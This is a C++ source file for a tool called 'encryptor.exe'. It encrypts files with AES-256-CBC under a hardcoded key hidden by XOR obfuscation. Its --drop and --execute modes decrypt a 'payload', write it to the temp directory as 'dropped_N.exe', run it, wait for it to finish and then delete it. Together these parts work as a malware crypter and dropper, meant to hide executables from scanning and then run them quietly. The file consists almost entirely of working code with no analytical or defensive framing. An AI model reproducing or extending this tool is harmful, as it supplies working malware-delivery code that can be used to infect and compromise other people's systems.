#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <openssl/evp.h>
#include <openssl/rand.h>

#ifdef _WIN32
#include <windows.h>
#include <shellapi.h>
#else
#include <cstdlib>
#include <unistd.h>
#include <sys/wait.h>
#endif

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

inline void decryptKey(uint8_t* keyBuf) {
    for (size_t i = 0; i < keyLen; ++i) {
        keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
    }
}

// AES-256 key and IV (32 bytes for AES-256, 16 bytes for IV)
uint8_t aesKey[32];
uint8_t aesIV[16];

void initializeAES() {
    // Generate a 32-byte AES-256 key from the XOR key
    uint8_t key[keyLen];
    decryptKey(key);
    
    // Use the XOR key as a seed to generate AES key and IV
    // This maintains compatibility with the existing key derivation
    for (int i = 0; i < 32; i++) {
        aesKey[i] = key[i % keyLen] ^ (i * 0x37);
    }
    for (int i = 0; i < 16; i++) {
        aesIV[i] = key[i % keyLen] ^ (i * 0x73);
    }
}

bool encryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(input.size() + EVP_MAX_BLOCK_LENGTH);
    int outLen;
    
    if (EVP_EncryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_EncryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(outLen + finalLen);
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

bool decryptAES(const std::vector<uint8_t>& input, std::vector<uint8_t>& output) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aesKey, aesIV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(input.size());
    int outLen;
    
    if (EVP_DecryptUpdate(ctx, output.data(), &outLen, input.data(), input.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int finalLen;
    if (EVP_DecryptFinal_ex(ctx, output.data() + outLen, &finalLen) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    output.resize(outLen + finalLen);
    EVP_CIPHER_CTX_free(ctx);
    return true;
}

std::string getTempPath() {
#ifdef _WIN32
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath);
#else
    const char* tempDir = getenv("TMPDIR");
    if (!tempDir) tempDir = getenv("TMP");
    if (!tempDir) tempDir = "/tmp";
    return std::string(tempDir) + "/";
#endif
}

std::string generateTempFilename() {
    static int counter = 0;
    std::string tempPath = getTempPath();
    std::string filename = "dropped_" + std::to_string(counter++) + ".exe";
    return tempPath + filename;
}

bool dropAndExecute(const std::vector<uint8_t>& decryptedData) {
    std::string tempFile = generateTempFilename();
    
    // Write decrypted data to temp file
    std::ofstream outFile(tempFile, std::ios::binary);
    if (!outFile) {
        std::cerr << "Failed to create temp file: " << tempFile << std::endl;
        return false;
    }
    
    outFile.write(reinterpret_cast<const char*>(decryptedData.data()), decryptedData.size());
    outFile.close();
    
    // Make file executable (Unix/Linux)
#ifndef _WIN32
    chmod(tempFile.c_str(), 0755);
#endif
    
    std::cout << "Dropped file to: " << tempFile << std::endl;
    
    // Execute the dropped file
#ifdef _WIN32
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = tempFile.c_str();
    sei.nShow = SW_SHOW;
    
    if (!ShellExecuteExA(&sei) || !sei.hProcess) {
        std::cerr << "Failed to execute dropped file." << std::endl;
        return false;
    }
    
    // Wait for execution to complete
    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);
    
    // Clean up temp file
    DeleteFileA(tempFile.c_str());
#else
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        execl(tempFile.c_str(), tempFile.c_str(), nullptr);
        exit(1);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
        
        // Clean up temp file
        unlink(tempFile.c_str());
    } else {
        std::cerr << "Failed to execute dropped file." << std::endl;
        return false;
    }
#endif
    
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage:\n";
        std::cout << "  encryptor.exe <inputfile> <outputfile> [--drop]\n";
        std::cout << "  encryptor.exe --decrypt <encryptedfile> [--execute]\n";
        return 1;
    }

    initializeAES();

    std::string mode = argv[1];
    
    if (mode == "--decrypt") {
        // Decrypt mode
        if (argc < 3) {
            std::cerr << "Missing encrypted file path." << std::endl;
            return 1;
        }
        
        std::ifstream fin(argv[2], std::ios::binary);
        if (!fin) {
            std::cerr << "Failed to open encrypted file." << std::endl;
            return 1;
        }
        
        // Read encrypted data
        fin.seekg(0, std::ios::end);
        size_t fileSize = fin.tellg();
        fin.seekg(0, std::ios::beg);
        
        std::vector<uint8_t> encryptedData(fileSize);
        fin.read(reinterpret_cast<char*>(encryptedData.data()), fileSize);
        
        // Decrypt data
        std::vector<uint8_t> decryptedData;
        if (!decryptAES(encryptedData, decryptedData)) {
            std::cerr << "Decryption failed." << std::endl;
            return 1;
        }
        
        std::cout << "Decryption successful. Size: " << decryptedData.size() << " bytes" << std::endl;
        
        // Check if execution is requested
        if (argc > 3 && std::string(argv[3]) == "--execute") {
            std::cout << "Executing decrypted payload..." << std::endl;
            if (!dropAndExecute(decryptedData)) {
                std::cerr << "Failed to execute payload." << std::endl;
                return 1;
            }
        } else {
            // Write decrypted data to output file
            std::string outputFile = (argc > 3) ? argv[3] : "decrypted_output.bin";
            std::ofstream fout(outputFile, std::ios::binary);
            if (!fout) {
                std::cerr << "Failed to create output file." << std::endl;
                return 1;
            }
            fout.write(reinterpret_cast<const char*>(decryptedData.data()), decryptedData.size());
            std::cout << "Decrypted data written to: " << outputFile << std::endl;
        }
        
    } else {
        // Encrypt mode
        std::ifstream fin(argv[1], std::ios::binary);
        if (!fin) {
            std::cerr << "Failed to open input file." << std::endl;
            return 1;
        }

        std::ofstream fout(argv[2], std::ios::binary);
        if (!fout) {
            std::cerr << "Failed to open output file." << std::endl;
            return 1;
        }

        // Read entire file into memory
        fin.seekg(0, std::ios::end);
        size_t fileSize = fin.tellg();
        fin.seekg(0, std::ios::beg);

        std::vector<uint8_t> inputData(fileSize);
        fin.read(reinterpret_cast<char*>(inputData.data()), fileSize);

        std::vector<uint8_t> encryptedData;
        if (!encryptAES(inputData, encryptedData)) {
            std::cerr << "Encryption failed." << std::endl;
            return 1;
        }

        fout.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());

        std::cout << "File encrypted successfully using AES-256-CBC." << std::endl;
        
        // Check if drop and execute is requested
        if (argc > 3 && std::string(argv[3]) == "--drop") {
            std::cout << "Dropping and executing encrypted payload..." << std::endl;
            if (!dropAndExecute(inputData)) {
                std::cerr << "Failed to drop and execute payload." << std::endl;
                return 1;
            }
        }
    }

    return 0;
}
